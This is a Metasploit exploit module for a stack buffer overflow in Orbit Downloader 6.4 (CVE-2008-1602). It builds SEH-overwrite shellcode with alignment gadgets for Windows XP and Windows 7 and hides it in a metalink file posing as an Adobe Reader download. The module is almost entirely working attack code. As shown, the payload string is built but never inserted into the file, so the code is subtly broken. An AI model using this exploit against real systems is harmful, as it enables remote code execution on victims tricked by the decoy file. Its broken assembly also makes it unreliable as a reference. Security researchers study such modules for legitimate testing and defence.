# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
require &#039;msf/core&#039;
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
    include Msf::Exploit::FILEFORMAT
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Orbit Downloader URL Unicode Conversion Overflow&#039;,
            &#039;Description&#039;    => %q{
                    This module exploits a stack-based buffer overflow in Orbit Downloader.
                The vulnerability is due to Orbit converting an URL ascii string to unicode
                in a insecure way with MultiByteToWideChar.
                The vulnerability is exploited with a specially crafted metalink file that
                should be opened with Orbit through the "File->Add Metalink..." option.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;Diego Juarez&#039;, # Vulnerability discovery
                    &#039;juan vazquez&#039;, # Metasploit module
                ],
            &#039;Version&#039;        => &#039;$ $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;BID&#039;, &#039;28541&#039; ],
                    [ &#039;OSVDB&#039;, &#039;44036&#039; ],
                    [ &#039;CVE&#039;, &#039;2008-1602&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.coresecurity.com/content/orbit-downloader&#039; ],
                ],
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;       => 2000,
                    &#039;EncoderType&#039;   => Msf::Encoder::Type::AlphanumUnicodeMixed,
                    &#039;EncoderOptions&#039; => { &#039;BufferRegister&#039; => &#039;EAX&#039; },
                    &#039;BadChars&#039;    => "\x00\x09\x0a\x0b\x0c\x0d\x26\x3c",
                    &#039;DisableNops&#039; => true,
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;Orbit Downloader 6.4 on Windows XP SP3&#039;,
                        {
                            &#039;Ret&#039; => 0x4b38, # p/p/r unicode compatible from orbitdm.exe
                            &#039;Nop&#039; => 0x46, # 004600 => add [esi+0x0],al
                            &#039;AddEax&#039; => "\x05\x15\x11", # add eax,0x11001500
                            &#039;Offset&#039; => 4
                        }
                    ],
                    [ &#039;Orbit Downloader 6.4 on Windows 7&#039;,
                        {
                            &#039;Ret&#039; => 0x4b38, # p/p/r unicode compatible from orbitdm.exe
                            &#039;Nop&#039; => 0x46, # 004600 => add [esi+0x0],al
                            &#039;AddEax&#039; => "\x05\x16\x11", # add eax,0x11001600
                            &#039;Offset&#039; => 120
                        }
                    ]
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => &#039;Apr 03 2008&#039;,
            &#039;DefaultTarget&#039;  => 0))
        register_options(
            [
                OptString.new(&#039;FILENAME&#039;, [ true, &#039;The file name.&#039;,  &#039;msf.metalink&#039;]),
            ], self.class)
    end
    def exploit
        sploit = rand_text_alpha(4096 - "http://".length)
        sploit << "\xff" * 2 # EIP =>  Access Violation
        sploit << rand_text_alpha(120) # padding
        sploit << "\x61\x62" # NSEH # popad (61) + nop compatible with unicode (add [edx+0x0],ah # 006200)
        sploit << [target.ret].pack("v") # seh # ppr
        sploit << target[&#039;Nop&#039;]
        sploit << target[&#039;AddEax&#039;] # eax align is os dependant
        sploit << target[&#039;Nop&#039;]
        sploit << "\x2d\x11\x11" # sub eax,0x11001100
        sploit << target[&#039;Nop&#039;]
        sploit << "\x50" # push eax
        sploit << target[&#039;Nop&#039;]
        sploit << "\xc3" # ret
        sploit << rand_text_alpha(target[&#039;Offset&#039;]) # align shellcode to eax pointer
        sploit << payload.encoded
        metalink = %Q|
<?xml version="1.0" encoding="utf-8"?>
<metalink version="3.0" generator="Metalink Generator v1.00.0034" xmlns="http://www.metalinker.org/">
    <publisher>
        <name>Adobe</name>
        <url>http://www.adobe.com/</url>
    </publisher>
    <description>Adobe Acrobat Reader</description>
    <files>
        <file name="AdbeRdr80_en_US.exe">
            <version>8.0</version>
            <language>en-US</language>
            <os>Windows-x86</os>
            <verification>
                <hash type="md5">0ab5ce309f313ed028824251c798b35c</hash>
            </verification>
            <resources>
            </resources>
        </file>
    </files>
</metalink>
|
        print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file ...")
        file_create(metalink)
    end
end



